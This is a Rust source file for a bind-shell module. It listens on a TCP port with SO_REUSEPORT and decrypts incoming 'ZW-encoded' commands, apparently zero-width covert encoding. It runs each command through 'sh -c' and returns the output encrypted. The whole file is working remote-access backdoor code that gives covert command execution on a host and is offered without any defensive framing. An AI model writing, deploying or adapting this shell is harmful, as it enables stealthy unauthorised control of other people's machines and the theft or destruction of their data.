//! TCP bind shell with ZW-encrypted transport and SO_REUSEPORT.

use std::net::SocketAddr;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tracing::{debug, error, info, warn};

use arcticfox_zwtransport::ZwSession;

/// Start a ZW-encrypted TCP bind shell.
///
/// Accepts connections, performs ZW handshake, then enters
/// command-execution loop. All traffic is encrypted+ZW-encoded.
pub async fn spawn_tcp_shell(
    addr: SocketAddr,
    session_key: [u8; 32],
    idle_timeout_secs: u64,
) -> std::io::Result<()> {
    let listener = crate::tcp_reuse_listener(&addr)?;
    let listener = TcpListener::from_std(listener)?;
    info!("TCP ZW bind shell listening on {} (SO_REUSEPORT)", addr);

    loop {
        let (stream, peer) = match listener.accept().await {
            Ok(conn) => conn,
            Err(e) => {
                error!("TCP accept error: {e}");
                continue;
            }
        };

        info!("TCP ZW connection from {}", peer);
        let key = session_key;
        tokio::spawn(async move {
            if let Err(e) = handle_tcp_client(stream, key, idle_timeout_secs).await {
                warn!("TCP client {} error: {}", peer, e);
            }
        });
    }
}

async fn handle_tcp_client(
    mut stream: TcpStream,
    session_key: [u8; 32],
    idle_timeout_secs: u64,
) -> std::io::Result<()> {
    let mut session = ZwSession::new(session_key);
    let mut buf = vec![0u8; 4096];

    // Read initial command
    loop {
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(idle_timeout_secs),
            stream.read(&mut buf),
        )
        .await
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::TimedOut, "idle timeout"))??;

        if n == 0 {
            break;
        }

        let data = String::from_utf8_lossy(&buf[..n]).to_string();

        // Try to extract ZW frame
        if let Ok(plaintext) = session.open(&data) {
            let cmd = String::from_utf8_lossy(&plaintext).to_string();
            debug!("TCP ZW command: {}", cmd);

            // Execute
            let output = {
                let result = std::process::Command::new("sh")
                    .arg("-c")
                    .arg(&cmd)
                    .output();
                match result {
                    Ok(out) => {
                        let stdout = String::from_utf8_lossy(&out.stdout);
                        let stderr = String::from_utf8_lossy(&out.stderr);
                        if stderr.is_empty() {
                            stdout.to_string()
                        } else {
                            format!("{}\n{}", stdout, stderr)
                        }
                    }
                    Err(e) => format!("[error: {}]", e),
                }
            };

            // Send ZW-encrypted response
            if let Ok(frame) = session.seal(output.as_bytes()) {
                stream.write_all(frame.as_bytes()).await?;
                stream.flush().await?;
            }
        }
    }

    info!("TCP ZW client disconnected");
    Ok(())
}
